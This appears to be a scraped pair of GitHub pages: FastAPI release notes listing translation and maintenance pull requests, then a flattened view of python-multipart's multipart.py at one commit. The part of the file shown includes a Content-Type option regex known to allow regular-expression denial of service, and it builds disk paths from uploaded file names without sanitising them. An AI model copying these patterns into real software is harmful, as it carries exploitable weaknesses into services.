* 🌐 Add Russian translation for `docs/ru/docs/tutorial/encoder.md`. PR [#10374](https://github.com/tiangolo/fastapi/pull/10374) by [@AlertRED](https://github.com/AlertRED).
* 🌐 Add Russian translation for `docs/ru/docs/tutorial/body-updates.md`. PR [#10373](https://github.com/tiangolo/fastapi/pull/10373) by [@AlertRED](https://github.com/AlertRED).
* 🌐 Russian translation: updated `fastapi-people.md`.. PR [#10255](https://github.com/tiangolo/fastapi/pull/10255) by [@NiKuma0](https://github.com/NiKuma0).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/security/index.md`. PR [#5798](https://github.com/tiangolo/fastapi/pull/5798) by [@3w36zj6](https://github.com/3w36zj6).
* 🌐 Add German translation for `docs/de/docs/advanced/generate-clients.md`. PR [#10725](https://github.com/tiangolo/fastapi/pull/10725) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add German translation for `docs/de/docs/advanced/openapi-webhooks.md`. PR [#10712](https://github.com/tiangolo/fastapi/pull/10712) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add German translation for `docs/de/docs/advanced/custom-response.md`. PR [#10624](https://github.com/tiangolo/fastapi/pull/10624) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add German translation for `docs/de/docs/advanced/additional-status-codes.md`. PR [#10617](https://github.com/tiangolo/fastapi/pull/10617) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add German translation for `docs/de/docs/tutorial/middleware.md`. PR [#10391](https://github.com/tiangolo/fastapi/pull/10391) by [@JohannesJungbluth](https://github.com/JohannesJungbluth).
* 🌐 Add German translation for introduction documents. PR [#10497](https://github.com/tiangolo/fastapi/pull/10497) by [@nilslindemann](https://github.com/nilslindemann).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/encoder.md`. PR [#1955](https://github.com/tiangolo/fastapi/pull/1955) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/extra-data-types.md`. PR [#1932](https://github.com/tiangolo/fastapi/pull/1932) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Turkish translation for `docs/tr/docs/async.md`. PR [#5191](https://github.com/tiangolo/fastapi/pull/5191) by [@BilalAlpaslan](https://github.com/BilalAlpaslan).
* 🌐 Add Turkish translation for `docs/tr/docs/project-generation.md`. PR [#5192](https://github.com/tiangolo/fastapi/pull/5192) by [@BilalAlpaslan](https://github.com/BilalAlpaslan).
* 🌐 Add Korean translation for `docs/ko/docs/deployment/docker.md`. PR [#5657](https://github.com/tiangolo/fastapi/pull/5657) by [@nearnear](https://github.com/nearnear).
* 🌐 Add Korean translation for `docs/ko/docs/deployment/server-workers.md`. PR [#4935](https://github.com/tiangolo/fastapi/pull/4935) by [@jujumilk3](https://github.com/jujumilk3).
* 🌐 Add Korean translation for `docs/ko/docs/deployment/index.md`. PR [#4561](https://github.com/tiangolo/fastapi/pull/4561) by [@jujumilk3](https://github.com/jujumilk3).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/path-operation-configuration.md`. PR [#3639](https://github.com/tiangolo/fastapi/pull/3639) by [@jungsu-kwon](https://github.com/jungsu-kwon).
* 🌐 Modify the description of `zh` - Traditional Chinese. PR [#10889](https://github.com/tiangolo/fastapi/pull/10889) by [@cherinyy](https://github.com/cherinyy).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/static-files.md`. PR [#2957](https://github.com/tiangolo/fastapi/pull/2957) by [@jeesang7](https://github.com/jeesang7).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/response-model.md`. PR [#2766](https://github.com/tiangolo/fastapi/pull/2766) by [@hard-coders](https://github.com/hard-coders).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/body-multiple-params.md`. PR [#2461](https://github.com/tiangolo/fastapi/pull/2461) by [@PandaHun](https://github.com/PandaHun).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/query-params-str-validations.md`. PR [#2415](https://github.com/tiangolo/fastapi/pull/2415) by [@hard-coders](https://github.com/hard-coders).
* 🌐 Add Korean translation for `docs/ko/docs/python-types.md`. PR [#2267](https://github.com/tiangolo/fastapi/pull/2267) by [@jrim](https://github.com/jrim).
* 🌐 Add Korean translation for `docs/ko/docs/tutorial/body-nested-models.md`. PR [#2506](https://github.com/tiangolo/fastapi/pull/2506) by [@hard-coders](https://github.com/hard-coders).
* 🌐 Add Korean translation for `docs/ko/docs/learn/index.md`. PR [#10977](https://github.com/tiangolo/fastapi/pull/10977) by [@KaniKim](https://github.com/KaniKim).
* 🌐 Initialize translations for Traditional Chinese. PR [#10505](https://github.com/tiangolo/fastapi/pull/10505) by [@hsuanchi](https://github.com/hsuanchi).
* ✏️ Tweak the german translation of `docs/de/docs/tutorial/index.md`. PR [#10962](https://github.com/tiangolo/fastapi/pull/10962) by [@nilslindemann](https://github.com/nilslindemann).
* ✏️ Fix typo error in `docs/ko/docs/tutorial/path-params.md`. PR [#10758](https://github.com/tiangolo/fastapi/pull/10758) by [@2chanhaeng](https://github.com/2chanhaeng).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/dependencies/dependencies-with-yield.md`. PR [#1961](https://github.com/tiangolo/fastapi/pull/1961) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/dependencies/dependencies-in-path-operation-decorators.md`. PR [#1960](https://github.com/tiangolo/fastapi/pull/1960) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/dependencies/sub-dependencies.md`. PR [#1959](https://github.com/tiangolo/fastapi/pull/1959) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/background-tasks.md`. PR [#2668](https://github.com/tiangolo/fastapi/pull/2668) by [@tokusumi](https://github.com/tokusumi).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/dependencies/index.md` and `docs/ja/docs/tutorial/dependencies/classes-as-dependencies.md`. PR [#1958](https://github.com/tiangolo/fastapi/pull/1958) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/response-model.md`. PR [#1938](https://github.com/tiangolo/fastapi/pull/1938) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/body-multiple-params.md`. PR [#1903](https://github.com/tiangolo/fastapi/pull/1903) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/path-params-numeric-validations.md`. PR [#1902](https://github.com/tiangolo/fastapi/pull/1902) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/python-types.md`. PR [#1899](https://github.com/tiangolo/fastapi/pull/1899) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/handling-errors.md`. PR [#1953](https://github.com/tiangolo/fastapi/pull/1953) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/response-status-code.md`. PR [#1942](https://github.com/tiangolo/fastapi/pull/1942) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/extra-models.md`. PR [#1941](https://github.com/tiangolo/fastapi/pull/1941) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese tranlsation for `docs/ja/docs/tutorial/schema-extra-example.md`. PR [#1931](https://github.com/tiangolo/fastapi/pull/1931) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/body-nested-models.md`. PR [#1930](https://github.com/tiangolo/fastapi/pull/1930) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add Japanese translation for `docs/ja/docs/tutorial/body-fields.md`. PR [#1923](https://github.com/tiangolo/fastapi/pull/1923) by [@SwftAlpc](https://github.com/SwftAlpc).
* 🌐 Add German translation for `docs/de/docs/tutorial/index.md`. PR [#9502](https://github.com/tiangolo/fastapi/pull/9502) by [@fhabers21](https://github.com/fhabers21).
* 🌐 Add German translation for `docs/de/docs/tutorial/background-tasks.md`. PR [#10566](https://github.com/tiangolo/fastapi/pull/10566) by [@nilslindemann](https://github.com/nilslindemann).
* ✏️ Fix typo in `docs/ru/docs/index.md`. PR [#10672](https://github.com/tiangolo/fastapi/pull/10672) by [@Delitel-WEB](https://github.com/Delitel-WEB).
* ✏️ Fix typos in `docs/zh/docs/tutorial/extra-data-types.md`. PR [#10727](https://github.com/tiangolo/fastapi/pull/10727) by [@HiemalBeryl](https://github.com/HiemalBeryl).
* 🌐 Add Russian translation for `docs/ru/docs/tutorial/dependencies/classes-as-dependencies.md`. PR [#10410](https://github.com/tiangolo/fastapi/pull/10410) by [@AlertRED](https://github.com/AlertRED).

### Internal

* 👥 Update FastAPI People. PR [#11074](https://github.com/tiangolo/fastapi/pull/11074) by [@tiangolo](https://github.com/tiangolo).
* 🔧 Update sponsors: add Coherence. PR [#11066](https://github.com/tiangolo/fastapi/pull/11066) by [@tiangolo](https://github.com/tiangolo).
* 👷 Upgrade GitHub Action issue-manager. PR [#11056](https://github.com/tiangolo/fastapi/pull/11056) by [@tiangolo](https://github.com/tiangolo).
* 🍱 Update sponsors: TalkPython badge. PR [#11052](https://github.com/tiangolo/fastapi/pull/11052) by [@tiangolo](https://github.com/tiangolo).
* 🔧 Update sponsors: TalkPython badge image. PR [#11048](https://github.com/tiangolo/fastapi/pull/11048) by [@tiangolo](https://github.com/tiangolo).
* 🔧 Update sponsors, remove Deta. PR [#11041](https://github.com/tiangolo/fastapi/pull/11041) by [@tiangolo](https://github.com/tiangolo).
* 💄 Fix CSS breaking RTL languages (erroneously introduced by a previous RTL PR). PR [#11039](https://github.com/tiangolo/fastapi/pull/11039) by [@tiangolo](https://github.com/tiangolo).
* 🔧 Add Italian to `mkdocs.yml`. PR [#11016](https://github.com/tiangolo/fastapi/pull/11016) by [@alejsdev](https://github.com/alejsdev).
* 🔨 Verify `mkdocs.yml` languages in CI, update `docs.py`. PR [#11009](https://github.com/tiangolo/fastapi/pull/11009) by [@tiangolo](https://github.com/tiangolo).
* 🔧 Update config in `label-approved.yml` to accept translations with 1 reviewer. PR [#11007](https://github.com/tiangolo/fastapi/pull/11007) by [@alejsdev](https://github.com/alejsdev).
* 👷 Add changes-requested handling in GitHub Action issue manager. PR [#10971](https://github.com/tiangolo/fastapi/pull/10971) by [@tiangolo](https://github.com/tiangolo).
* 🔧 Group dependencies on dependabot updates. PR [#10952](https://github.com/tiangolo/fastapi/pull/10952) by [@Kludex](https://github.com/Kludex).
* ⬆ Bump actions/setup-python from 4 to 5. PR [#10764](https://github.com/tiangolo/fastapi/pull/10764) by [@dependabot[bot]](https://github.com/apps/dependabot).
* ⬆ Bump pypa/gh-action-pypi-publish from 1.8.10 to 1.8.11. PR [#10731](https://github.com/tiangolo/fastapi/pull/10731) by [@dependabot[bot]](https://github.com/apps/dependabot).
* ⬆ Bump dawidd6/action-download-artifact from 2.28.0 to 3.0.0. PR [#10777](https://github.com/tiangolo/fastapi/pull/10777) by [@dependabot[bot]](https://github.com/apps/dependabot).
* 🔧 Add support for translations to languages with a longer code name, like `zh-hant`. PR [#10950](https://github.com/tiangolo/fastapi/pull/10950) by [@tiangolo](https://github.com/tiangolo).

 Assets
2

 Loading

 👍
31
 alexted, rehth, YeonwooSung, antheiz, azwpayne, podsvirov, Abeautifulsnow, salahelfarissi, d-ganchar, stevleibelt, and 21 more reacted with thumbs up emoji
 😄
3
 alexted, firengate, and binbjz reacted with laugh emoji
 🎉
11
 alexted, cubillafabri, antheiz, podsvirov, hausg, visuxls, firengate, i0tool5, binbjz, whchi, and egoan82 reacted with hooray emoji
 ❤️
4
 alexted, fcoagz, firengate, and binbjz reacted with heart emoji
 🚀
14
 alexted, hasansezertasan, aaravind100, elalfymohamed, antheiz, mikeoller82, dikesh, firengate, i0tool5, binbjz, and 4 more reacted with rocket emoji
 👀
4
 alexted, amayakasa, binbjz, and BetaTester772 reacted with eyes emoji

All reactions

* 👍
  31 reactions
* 😄
  3 reactions
* 🎉
  11 reactions
* ❤️
  4 reactions
* 🚀
  14 reactions
* 👀
  4 reactions

 44 people reacted

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_35a9c675_20250114_181321.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKludex%2Fpython-multipart%2Fblob%2Fd3d16dae4b061c34fe9d3c9081d9800c49fc1f7a%2Fmultipart%2Fmultipart.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKludex%2Fpython-multipart%2Fblob%2Fd3d16dae4b061c34fe9d3c9081d9800c49fc1f7a%2Fmultipart%2Fmultipart.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Kludex%2Fpython-multipart)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Kludex](/Kludex)
/
**[python-multipart](/Kludex/python-multipart)**
Public

* [Notifications](/login?return_to=%2FKludex%2Fpython-multipart) You must be signed in to change notification settings
* [Fork
  63](/login?return_to=%2FKludex%2Fpython-multipart)
* [Star
   367](/login?return_to=%2FKludex%2Fpython-multipart)

* [Code](/Kludex/python-multipart)
* [Issues
  9](/Kludex/python-multipart/issues)
* [Pull requests
  8](/Kludex/python-multipart/pulls)
* [Actions](/Kludex/python-multipart/actions)
* [Security](/Kludex/python-multipart/security)
* [Insights](/Kludex/python-multipart/pulse)

Additional navigation options

* [Code](/Kludex/python-multipart)
* [Issues](/Kludex/python-multipart/issues)
* [Pull requests](/Kludex/python-multipart/pulls)
* [Actions](/Kludex/python-multipart/actions)
* [Security](/Kludex/python-multipart/security)
* [Insights](/Kludex/python-multipart/pulse)

## Files

 d3d16da
## Breadcrumbs

1. [python-multipart](/Kludex/python-multipart/tree/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a)
2. /[multipart](/Kludex/python-multipart/tree/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart)
/
# multipart.py

Copy path Blame  Blame
## Latest commit

## History

[History](/Kludex/python-multipart/commits/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py)1893 lines (1554 loc) · 69.6 KB d3d16da
## Breadcrumbs

1. [python-multipart](/Kludex/python-multipart/tree/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a)
2. /[multipart](/Kludex/python-multipart/tree/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart)
/
# multipart.py

Top
## File metadata and controls

* Code
* Blame

1893 lines (1554 loc) · 69.6 KB[Raw](https://github.com/Kludex/python-multipart/raw/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000from .decoders import \*from .exceptions import \*
import osimport reimport sysimport shutilimport loggingimport tempfilefrom io import BytesIOfrom numbers import Number
# Unique missing object.\_missing = object()
# States for the querystring parser.STATE\_BEFORE\_FIELD = 0STATE\_FIELD\_NAME = 1STATE\_FIELD\_DATA = 2
# States for the multipart parserSTATE\_START = 0STATE\_START\_BOUNDARY = 1STATE\_HEADER\_FIELD\_START = 2STATE\_HEADER\_FIELD = 3STATE\_HEADER\_VALUE\_START = 4STATE\_HEADER\_VALUE = 5STATE\_HEADER\_VALUE\_ALMOST\_DONE = 6STATE\_HEADERS\_ALMOST\_DONE = 7STATE\_PART\_DATA\_START = 8STATE\_PART\_DATA = 9STATE\_PART\_DATA\_END = 10STATE\_END = 11
STATES = [ "START", "START\_BOUNDARY", "HEADER\_FIELD\_START", "HEADER\_FIELD", "HEADER\_VALUE\_START", "HEADER\_VALUE", "HEADER\_VALUE\_ALMOST\_DONE", "HEADRES\_ALMOST\_DONE", "PART\_DATA\_START", "PART\_DATA", "PART\_DATA\_END", "END"]
# Flags for the multipart parser.FLAG\_PART\_BOUNDARY = 1FLAG\_LAST\_BOUNDARY = 2
# Get constants. Since iterating over a str on Python 2 gives you a 1-length# string, but iterating over a bytes object on Python 3 gives you an integer,# we need to save these constants.CR = b'\r'[0]LF = b'\n'[0]COLON = b':'[0]SPACE = b' '[0]HYPHEN = b'-'[0]AMPERSAND = b'&'[0]SEMICOLON = b';'[0]LOWER\_A = b'a'[0]LOWER\_Z = b'z'[0]NULL = b'\x00'[0]
# Lower-casing a character is different, because of the difference between# str on Py2, and bytes on Py3. Same with getting the ordinal value of a byte,# and joining a list of bytes together.# These functions abstract that.lower\_char = lambda c: c | 0x20ord\_char = lambda c: cjoin\_bytes = lambda b: bytes(list(b))
# These are regexes for parsing header values.SPECIAL\_CHARS = re.escape(b'()<>@,;:\\"/[]?={} \t')QUOTED\_STR = br'"(?:\\.|[^"])\*"'VALUE\_STR = br'(?:[^' + SPECIAL\_CHARS + br']+|' + QUOTED\_STR + br')'OPTION\_RE\_STR = ( br'(?:;|^)\s\*([^' + SPECIAL\_CHARS + br']+)\s\*=\s\*(' + VALUE\_STR + br')')OPTION\_RE = re.compile(OPTION\_RE\_STR)QUOTE = b'"'[0]
def parse\_options\_header(value): """ Parses a Content-Type header into a value in the following format: (content\_type, {parameters}) """ if not value: return (b'', {})
 # If we are passed a string, we assume that it conforms to WSGI and does # not contain any code point that's not in latin-1. if isinstance(value, str): # pragma: no cover value = value.encode('latin-1')
 # If we have no options, return the string as-is. if b';' not in value: return (value.lower().strip(), {})
 # Split at the first semicolon, to get our value and then options. ctype, rest = value.split(b';', 1) options = {}
 # Parse the options. for match in OPTION\_RE.finditer(rest): key = match.group(1).lower() value = match.group(2) if value[0] == QUOTE and value[-1] == QUOTE: # Unquote the value. value = value[1:-1] value = value.replace(b'\\\\', b'\\').replace(b'\\"', b'"')
 # If the value is a filename, we need to fix a bug on IE6 that sends # the full file path instead of the filename. if key == b'filename': if value[1:3] == b':\\' or value[:2] == b'\\\\': value = value.split(b'\\')[-1]
 options[key] = value
 return ctype, options
class Field: """A Field object represents a (parsed) form field. It represents a single field with a corresponding name and value.
 The name that a :class:`Field` will be instantiated with is the same name that would be found in the following HTML::
 <input name="name\_goes\_here" type="text"/>
 This class defines two methods, :meth:`on\_data` and :meth:`on\_end`, that will be called when data is written to the Field, and when the Field is finalized, respectively.
 :param name: the name of the form field """ def \_\_init\_\_(self, name): self.\_name = name self.\_value = []
 # We cache the joined version of \_value for speed. self.\_cache = \_missing
 @classmethod def from\_value(klass, name, value): """Create an instance of a :class:`Field`, and set the corresponding value - either None or an actual value. This method will also finalize the Field itself.
 :param name: the name of the form field :param value: the value of the form field - either a bytestring or None """
 f = klass(name) if value is None: f.set\_none() else: f.write(value) f.finalize() return f
 def write(self, data): """Write some data into the form field.
 :param data: a bytestring """ return self.on\_data(data)
 def on\_data(self, data): """This method is a callback that will be called whenever data is written to the Field.
 :param data: a bytestring """ self.\_value.append(data) self.\_cache = \_missing return len(data)
 def on\_end(self): """This method is called whenever the Field is finalized. """ if self.\_cache is \_missing: self.\_cache = b''.join(self.\_value)
 def finalize(self): """Finalize the form field. """ self.on\_end()
 def close(self): """Close the Field object. This will free any underlying cache. """ # Free our value array. if self.\_cache is \_missing: self.\_cache = b''.join(self.\_value)
 del self.\_value
 def set\_none(self): """Some fields in a querystring can possibly have a value of None - for example, the string "foo&bar=&baz=asdf" will have a field with the name "foo" and value None, one with name "bar" and value "", and one with name "baz" and value "asdf". Since the write() interface doesn't support writing None, this function will set the field value to None. """ self.\_cache = None
 @property def field\_name(self): """This property returns the name of the field.""" return self.\_name
 @property def value(self): """This property returns the value of the form field.""" if self.\_cache is \_missing: self.\_cache = b''.join(self.\_value)
 return self.\_cache
 def \_\_eq\_\_(self, other): if isinstance(other, Field): return ( self.field\_name == other.field\_name and self.value == other.value ) else: return NotImplemented
 def \_\_repr\_\_(self): if len(self.value) > 97: # We get the repr, and then insert three dots before the final # quote. v = repr(self.value[:97])[:-1] + "...'" else: v = repr(self.value)
 return "{}(field\_name={!r}, value={})".format( self.\_\_class\_\_.\_\_name\_\_, self.field\_name, v )
class File: """This class represents an uploaded file. It handles writing file data to either an in-memory file or a temporary file on-disk, if the optional threshold is passed.
 There are some options that can be passed to the File to change behavior of the class. Valid options are as follows:
 .. list-table:: :widths: 15 5 5 30 :header-rows: 1
 \* - Name - Type - Default - Description \* - UPLOAD\_DIR - `str` - None - The directory to store uploaded files in. If this is None, a temporary file will be created in the system's standard location. \* - UPLOAD\_DELETE\_TMP - `bool` - True - Delete automatically created TMP file \* - UPLOAD\_KEEP\_FILENAME - `bool` - False - Whether or not to keep the filename of the uploaded file. If True, then the filename will be converted to a safe representation (e.g. by removing any invalid path segments), and then saved with the same name). Otherwise, a temporary name will be used. \* - UPLOAD\_KEEP\_EXTENSIONS - `bool` - False - Whether or not to keep the uploaded file's extension. If False, the file will be saved with the default temporary extension (usually ".tmp"). Otherwise, the file's extension will be maintained. Note that this will properly combine with the UPLOAD\_KEEP\_FILENAME setting. \* - MAX\_MEMORY\_FILE\_SIZE - `int` - 1 MiB - The maximum number of bytes of a File to keep in memory. By default, the contents of a File are kept into memory until a certain limit is reached, after which the contents of the File are written to a temporary file. This behavior can be disabled by setting this value to an appropriately large value (or, for example, infinity, such as `float('inf')`.
 :param file\_name: The name of the file that this :class:`File` represents
 :param field\_name: The field name that uploaded this file. Note that this can be None, if, for example, the file was uploaded with Content-Type application/octet-stream
 :param config: The configuration for this File. See above for valid configuration keys and their corresponding values. """ def \_\_init\_\_(self, file\_name, field\_name=None, config={}): # Save configuration, set other variables default. self.logger = logging.getLogger(\_\_name\_\_) self.\_config = config self.\_in\_memory = True self.\_bytes\_written = 0 self.\_fileobj = BytesIO()
 # Save the provided field/file name. self.\_field\_name = field\_name self.\_file\_name = file\_name
 # Our actual file name is None by default, since, depending on our # config, we may not actually use the provided name. self.\_actual\_file\_name = None
 # Split the extension from the filename. if file\_name is not None: base, ext = os.path.splitext(file\_name) self.\_file\_base = base self.\_ext = ext
 @property def field\_name(self): """The form field associated with this file. May be None if there isn't one, for example when we have an application/octet-stream upload. """ return self.\_field\_name
 @property def file\_name(self): """The file name given in the upload request. """ return self.\_file\_name
 @property def actual\_file\_name(self): """The file name that this file is saved as. Will be None if it's not currently saved on disk. """ return self.\_actual\_file\_name
 @property def file\_object(self): """The file object that we're currently writing to. Note that this will either be an instance of a :class:`io.BytesIO`, or a regular file object. """ return self.\_fileobj
 @property def size(self): """The total size of this file, counted as the number of bytes that currently have been written to the file. """ return self.\_bytes\_written
 @property def in\_memory(self): """A boolean representing whether or not this file object is currently stored in-memory or on-disk. """ return self.\_in\_memory
 def flush\_to\_disk(self): """If the file is already on-disk, do nothing. Otherwise, copy from the in-memory buffer to a disk file, and then reassign our internal file object to this new disk file.
 Note that if you attempt to flush a file that is already on-disk, a warning will be logged to this module's logger. """ if not self.\_in\_memory: self.logger.warning( "Trying to flush to disk when we're not in memory" ) return
 # Go back to the start of our file. self.\_fileobj.seek(0)
 # Open a new file. new\_file = self.\_get\_disk\_file()
 # Copy the file objects. shutil.copyfileobj(self.\_fileobj, new\_file)
 # Seek to the new position in our new file. new\_file.seek(self.\_bytes\_written)
 # Reassign the fileobject. old\_fileobj = self.\_fileobj self.\_fileobj = new\_file
 # We're no longer in memory. self.\_in\_memory = False
 # Close the old file object. old\_fileobj.close()
 def \_get\_disk\_file(self): """This function is responsible for getting a file object on-disk for us. """ self.logger.info("Opening a file on disk")
 file\_dir = self.\_config.get('UPLOAD\_DIR') keep\_filename = self.\_config.get('UPLOAD\_KEEP\_FILENAME', False) keep\_extensions = self.\_config.get('UPLOAD\_KEEP\_EXTENSIONS', False) delete\_tmp = self.\_config.get('UPLOAD\_DELETE\_TMP', True)
 # If we have a directory and are to keep the filename... if file\_dir is not None and keep\_filename: self.logger.info("Saving with filename in: %r", file\_dir)
 # Build our filename. # TODO: what happens if we don't have a filename? fname = self.\_file\_base if keep\_extensions: fname = fname + self.\_ext
 path = os.path.join(file\_dir, fname) try: self.logger.info("Opening file: %r", path) tmp\_file = open(path, 'w+b') except OSError as e: tmp\_file = None
 self.logger.exception("Error opening temporary file") raise FileError("Error opening temporary file: %r" % path) else: # Build options array. # Note that on Python 3, tempfile doesn't support byte names. We # encode our paths using the default filesystem encoding. options = {} if keep\_extensions: ext = self.\_ext if isinstance(ext, bytes): ext = ext.decode(sys.getfilesystemencoding())
